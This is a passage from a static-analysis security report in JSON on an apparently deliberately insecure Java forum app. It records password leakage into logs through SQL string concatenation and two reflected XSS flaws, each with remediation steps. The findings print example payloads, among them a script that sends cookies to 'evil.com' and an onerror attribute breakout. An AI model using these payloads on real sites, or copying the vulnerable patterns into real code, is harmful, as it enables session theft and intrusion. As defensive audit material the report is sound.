        {
          "ruleId": "password-management",
          "level": "error",
          "message": {
            "text": "The ForumApplication bean wraps every DataSource in a ProxyDataSourceBuilder that logs every SQL statement at DEBUG level under the logger com.example.insecureforum.jdbc (line 23):\n\nDataSource loggingDataSource = ProxyDataSourceBuilder\n        .create(dataSource)\n        .logQueryBySlf4j(SLF4JLogLevel.DEBUG, \"com.example.insecureforum.jdbc\").build();\n\napplication.properties enables DEBUG for the whole com.example.insecureforum package (logging.level.com.example.insecureforum=DEBUG), which covers this sub-logger. Therefore every query that passes through the JdbcTemplate is logged.\n\nUserDAO.authenticate() builds its query by raw string concatenation:\n\"SELECT 1 FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"\n\nWhen a user attempts to log in, the full SQL string — including their plaintext password — is intercepted by the proxy and written to the log. An attacker who can read log files (e.g., via a log aggregator, a file-read vulnerability, misconfigured log storage, or access to the server) gains all user passwords. Even if DEBUG is disabled in production, the plaintext password still traverses the proxy and would be logged the moment DEBUG is re-enabled for troubleshooting.",
            "markdown": "The `ForumApplication` bean wraps every `DataSource` in a `ProxyDataSourceBuilder` that logs every SQL statement at `DEBUG` level under the logger `com.example.insecureforum.jdbc` (line 23):\n\n```java\nDataSource loggingDataSource = ProxyDataSourceBuilder\n        .create(dataSource)\n        .logQueryBySlf4j(SLF4JLogLevel.DEBUG, \"com.example.insecureforum.jdbc\").build();\n```\n\n`application.properties` enables DEBUG for the whole `com.example.insecureforum` package (`logging.level.com.example.insecureforum=DEBUG`), which covers this sub-logger. Therefore every query that passes through the `JdbcTemplate` is logged.\n\n`UserDAO.authenticate()` builds its query by raw string concatenation:\n```java\n\"SELECT 1 FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"\n```\n\nWhen a user attempts to log in, the full SQL string — including their plaintext password — is intercepted by the proxy and written to the log. An attacker who can read log files (e.g., via a log aggregator, a file-read vulnerability, misconfigured log storage, or access to the server) gains all user passwords. Even if DEBUG is disabled in production, the plaintext password still traverses the proxy and would be logged the moment DEBUG is re-enabled for troubleshooting."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/java/com/example/insecureforum/ForumApplication.java"
                },
                "region": {
                  "startLine": 23,
                  "snippet": {
                    "text": "\n    @Bean\n    public JdbcTemplate jdbcTemplate(DataSource dataSource) {\n        DataSource loggingDataSource = ProxyDataSourceBuilder\n                .create(dataSource)\n                .logQueryBySlf4j(SLF4JLogLevel.DEBUG, \"com.example.insecureforum.jdbc\").build();\n        return new JdbcTemplate(loggingDataSource);\n    }\n\n}\n"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "0288CB43E538FE8BC3FAD41DC8203BB5"
          },
          "properties": {
            "impact": 3.5,
            "likelihood": 4,
            "snippetStartLine": 18,
            "summary": "SQL query logging proxy writes plaintext user passwords to application logs",
            "remediationSummary": "Use parameterized queries in UserDAO so passwords are not embedded in loggable SQL strings, and remove/restrict the ProxyDataSource query logger.",
            "remediation": "1. **Stop embedding credentials in SQL strings.** Migrate `UserDAO.authenticate()` to use parameterized queries (prepared statements via `JdbcTemplate.query(sql, args, rowMapper)` or named parameters). This ensures the password is never part of the loggable SQL text.\n\n2. **Remove the query-logging proxy, or restrict its scope.** The `ProxyDataSourceBuilder` with `logQueryBySlf4j` logs the full SQL text verbatim. If query-level tracing is needed for debugging, log only non-sensitive queries, or mask bind parameters. Many JDBC proxy libraries support parameter masking.\n\n3. **Reduce the default log level.** Do not ship `logging.level.com.example.insecureforum=DEBUG` in production configuration. Move it to a development-only profile (`application-dev.properties`).\n\n4. **Hash passwords at rest.** Even after fixing the SQL injection and logging issues, passwords in the `users` table should be stored as a strong one-way hash (e.g., bcrypt), so a compromised log or database does not expose cleartext secrets."
          }
        },
        {
          "ruleId": "cross-site-scripting/reflected",
          "level": "error",
          "message": {
            "text": "The EL expression ${prefillUsername} is rendered directly into the HTML body inside a <p> element on line 14 without any HTML-encoding. The value is sourced from the username HTTP query parameter in AuthenticationController.loginSubmit(), which on authentication failure issues a redirect to /auth/login?username=<attacker_value>. The GET handler at /auth/login then binds that query parameter directly to the request attribute prefillUsername with no sanitisation:\n\nrequest.setAttribute(\"prefillUsername\", username);\n\nBecause JSP EL (${...}) does not HTML-encode by default, an attacker can craft a URL such as:\n/auth/login?username=<script>document.location='https://evil.com/?c='+document.cookie</script>\n\nand trick a victim into visiting it (e.g. via a phishing link). The script executes in the victim's browser under the forum's origin, allowing session-cookie theft, credential harvesting, or UI redressing.",
            "markdown": "The EL expression `${prefillUsername}` is rendered directly into the HTML body inside a `<p>` element on line 14 without any HTML-encoding. The value is sourced from the `username` HTTP query parameter in `AuthenticationController.loginSubmit()`, which on authentication failure issues a redirect to `/auth/login?username=<attacker_value>`. The GET handler at `/auth/login` then binds that query parameter directly to the request attribute `prefillUsername` with no sanitisation:\n\n```java\nrequest.setAttribute(\"prefillUsername\", username);\n```\n\nBecause JSP EL (`${...}`) does **not** HTML-encode by default, an attacker can craft a URL such as:\n```\n/auth/login?username=<script>document.location='https://evil.com/?c='+document.cookie</script>\n```\nand trick a victim into visiting it (e.g. via a phishing link). The script executes in the victim's browser under the forum's origin, allowing session-cookie theft, credential harvesting, or UI redressing."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/webapp/WEB-INF/views/auth/login.jsp"
                },
                "region": {
                  "startLine": 14,
                  "snippet": {
                    "text": "                    <div class=\"column is-6 is-offset-3\">\n                        <c:if test=\"${!authenticationFailed}\">\n                            <p class=\"subtitle has-text-grey\">Please login to access the forum</p>\n                        </c:if>\n                        <c:if test=\"${authenticationFailed}\">\n                            <p class=\"subtitle has-text-danger\">Authentication failed for user ${prefillUsername}, please retry</p>\n                        </c:if>\n                        <div class=\"box\">\n                            <div class=\"field\">\n                                <div class=\"control has-icons-left\">\n                                    <input name=\"username\" class=\"input is-large\" type=\"text\""
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "3367D21BCDB5E8735ABCB527DAB3EBEA"
          },
          "properties": {
            "impact": 4,
            "likelihood": 4.5,
            "snippetStartLine": 9,
            "summary": "Reflected XSS via unescaped ${prefillUsername} in error message paragraph",
            "remediationSummary": "Use &lt;c:out value=\"${prefillUsername}\"/&gt; or fn:escapeXml() instead of bare ${prefillUsername} to HTML-encode the reflected value.",
            "remediation": "Replace the raw EL expression with JSTL's `<c:out>`, which HTML-encodes by default:\n\n```jsp\n<p class=\"subtitle has-text-danger\">\n    Authentication failed for user <c:out value=\"${prefillUsername}\"/>, please retry\n</p>\n```\n\nAlternatively use the JSTL functions tag library: `${fn:escapeXml(prefillUsername)}`. Also consider URL-encoding the username when building the redirect in `AuthenticationController` to avoid injecting special characters into the redirect URL itself."
          }
        },
        {
          "ruleId": "cross-site-scripting/reflected",
          "level": "error",
          "message": {
            "text": "The EL expression ${prefillUsername} is written verbatim into the value attribute of the username <input> element on line 20. Because JSP EL does not HTML-encode, an attacker-controlled username value can break out of the attribute context:\n\n/auth/login?username=\"><img src=x onerror=alert(document.cookie)>\n\nThis closes the value=\"...\" attribute, closes the <input> tag, and injects arbitrary HTML/JavaScript. The data flow is the same as for line 14: the HTTP query parameter flows through AuthenticationController → request.setAttribute(\"prefillUsername\", username) → JSP output with no encoding.",
            "markdown": "The EL expression `${prefillUsername}` is written verbatim into the `value` attribute of the username `<input>` element on line 20. Because JSP EL does not HTML-encode, an attacker-controlled username value can break out of the attribute context:\n\n```\n/auth/login?username=\"><img src=x onerror=alert(document.cookie)>\n```\n\nThis closes the `value=\"...\"` attribute, closes the `<input>` tag, and injects arbitrary HTML/JavaScript. The data flow is the same as for line 14: the HTTP query parameter flows through `AuthenticationController` → `request.setAttribute(\"prefillUsername\", username)` → JSP output with no encoding."
          },
